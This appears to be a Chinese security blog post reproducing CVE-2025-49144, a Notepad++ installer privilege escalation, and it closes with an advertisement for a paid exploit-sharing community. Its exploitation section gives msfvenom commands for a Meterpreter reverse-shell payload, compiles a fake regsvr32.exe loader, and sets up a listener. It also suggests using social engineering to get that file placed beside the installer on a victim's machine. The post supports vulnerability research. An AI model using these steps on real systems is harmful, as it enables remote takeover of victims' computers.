#  Notepad++提权漏洞POC及一键部署环境（CVE-2025-49144）  
原创 a1batr0ss  天翁安全   2025-06-30 01:13  
  
**免责声明：**  
本公众号所发布的全部内容，包括但不限于技术文章、POC脚本、漏洞利用工具及相关测试环境，均仅限于合法的网络安全学习、研究和教学用途。所有人在使用上述内容时，应严格遵守中华人民共和国相关法律法规以及道德伦理要求。未经明确的官方书面授权，严禁将公众号内的任何内容用于未经授权的渗透测试、漏洞利用或攻击行为。 所有人仅可在自己合法拥有或管理的系统环境中进行本地漏洞复现与安全测试，或用于具有明确授权的合法渗透测试项目。所有人不得以任何形式利用公众号内提供的内容从事非法、侵权或其他不当活动。 如因违反上述规定或不当使用本公众号提供的任何内容，造成的一切法律责任、经济损失、纠纷及其他任何形式的不利后果，均由相关成员自行承担，与本公众号无任何关联。  
## 漏洞介绍  
  
Notepad++ 是一款功能强大的开源文本编辑器，适用于 Windows 平台，广泛用于程序开发和文本处理。它支持多种编程语言的语法高亮和代码折叠，内置插件系统可扩展功能，如正则查找替换、自动补全、FTP 编辑等。相比系统自带的记事本，Notepad++ 运行轻便、界面简洁，是程序员、运维人员和普通用户常用的编辑工具之一。  
  
Notepad++ 是一款免费开源的源代码编辑器。在 8.8.1 及之前的版本中，Notepad++ v8.8.1 安装程序存在一个权限提升漏洞，攻击者可以利用不安全的可执行文件搜索路径，使非特权用户获取 SYSTEM 级权限。攻击者可能通过社会工程学或点击劫持等手段，诱骗用户将合法安装程序与恶意可执行文件下载到同一目录（通常是“下载”文件夹，这被称为易受攻击目录）。当用户运行安装程序时，恶意代码将自动以 SYSTEM 权限执行。该问题已修复，并将在 8.8.2 版本中发布。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkjWdibFvGxAWSb1n9FgwTJKNMrp6vFDAWiccoEaumwD4wwtOKB0KkFlZA/640?wx_fmt=png&from=appmsg "")  
## 漏洞版本  
- Notepad++ < 8.8.2  
  
## 漏洞利用  
  
首先使用msfvenom生成shellcode，其中192.168.1.119是本地监听IP，8888是本地监听端口  
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.119 LPORT=8888 -f c > shellcode.txt
```  
  
接着将shellcode写入到regsvr32_loader.c中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIk9NgEx6gBIJGY2D5Y0WEIqvogAVRQtXzmdluQtTib7yodOaY8F1osHrQ/640?wx_fmt=png&from=appmsg "")  
  
然后执行以下命令生成一个regsvr32.exe  
```
x86_64-w64-mingw32-gcc regsvr32_loader.c -o regsvr32.exe -mwindows
```  
  
再之后开启一个meterpreter监听  
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.119
set LPORT 8888
run
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkqiajAmiaoDH3gDqdaajWrburZUIDpiawq6jeJTpoBibCRRuPH7hBrkjOZA/640?wx_fmt=png&from=appmsg "")  
  
最后我们在目标受害机器上，把Notepad++安装包和regsvr32.exe放在同一个目录下，点击进行安装  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIk6gjk06fYbrxCo088lJiahywOufXyzKIlFssFWUNuDuJyjP3IEXMQA2Q/640?wx_fmt=png&from=appmsg "")  
  
安装会卡在上图的位置，此时查看meterpreter监听，发现已经成功获取了目标的管理员权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkjPGR0jw6L9SP7ncxVnOCHLRJia7hkGbibMMRzLZdxgCmoXZa3HvriawsQ/640?wx_fmt=png&from=appmsg "")  
  
原作者对此漏洞的利用方法解释如下：一般用户下载文件时，都会下载到同一个下载文件夹，此时就可以利用社会工程学等手段在用户下载Notepad++安装包时同时下载regsvr32.exe，当这两个文件在同一个目录下时，用户安装Notepad++时即可触发漏洞。  
  
在我看来这个条件还是挺苛刻的，相比利用过程，更难的还是如何诱导用户把Notepad++安装包和regsvr32.exe放到一个文件夹下。  
## 漏洞修复  
  
**修复需要将版本升级**  
- Notepad++ >= 8.8.2  
  
## 知识星球  
  
**漏洞利用POC和批量检查脚本**  
可在知识星球内自行领取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIknUTKdxLc8FXE8ejbwL7cyp4dSxibvgjBA6Fo1ofENVeMH3csbGMEcKQ/640?wx_fmt=png&from=appmsg "")  
> 星球不定期更新市面上最新的热点漏洞及复现环境，欢迎加入交流和学习  
  
  
亮点一、**市面热点漏洞详细分析**  
，与**deepseek本地部署**  
息息相关的：Ollama任意文件读取漏洞（CVE-2024-37032）详细分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkVmWj8z9B7prhiauSHK5Ejuic8xoVUPnqdmDWLsbNbpZrAHXWzjticmzVA/640?wx_fmt=png&from=appmsg "")  
  
亮点二、**近日最新披露的明星**  
漏洞POC：Roundcube Mail 后台代码执行漏洞复现（CVE-2025-49113）及POC  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkQyepCAuqhH39vw5Dm000efoRpeLiamF9ZJDXbwicLqsPCF1konlZJRug/640?wx_fmt=png&from=appmsg "")  
  
亮点三、**框架漏洞专题-若依：**  
  
若依某漏洞分析：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIk7VVicKFxbfhxEj8VnJZqiaWEJg1runnmtXvJkrXHJibjW4tnDIBaKSiaqg/640?wx_fmt=png&from=appmsg "")  
  
以及帮助师傅们轻松搭建若依环境的docker的tar包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIk0UZjZzOyr0Y3Im8YYOliaEbhwEKRKHUToBRtr9VWNa60G2pSb2kOIZQ/640?wx_fmt=png&from=appmsg "")  
  
亮点四、**实战渗透测试技巧分享&讨论**  
：记一次信息泄漏到数据库接管的渗透测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIk6iaFczgiaJ8ic2tkTX7YGKaag2KJibuurgusENicBmGbCYgkh44ickZPtDqA/640?wx_fmt=png&from=appmsg "")  
  
某次若依系统渗透测试带来的思考与讨论  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkKz0ECeObHACOialHZNCdjiccsEhorCXD7Zh7uU78Z0hUs6aeATCrPPtg/640?wx_fmt=png&from=appmsg "")  
  
亮点五、一些比较新奇有趣的漏洞分享：Windows**拖拽图标**  
而触发的漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkiaXqAE8r1niaOv0cVpBP4vczrFBAZJdnFGLujOxGd9mP36t1GwkkicYvw/640?wx_fmt=png&from=appmsg "")  
  
知识星球加入方式如下，欢迎师傅们加入进行学习和讨论！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S4lH6ZZauXia0hg0s93wJrIkvw4a00NBpMS5ex8OFBD3dc4Mf9BfPiagT2g214kdKcs3YByq9pGpKiaw/640?wx_fmt=png&from=appmsg "")  
  
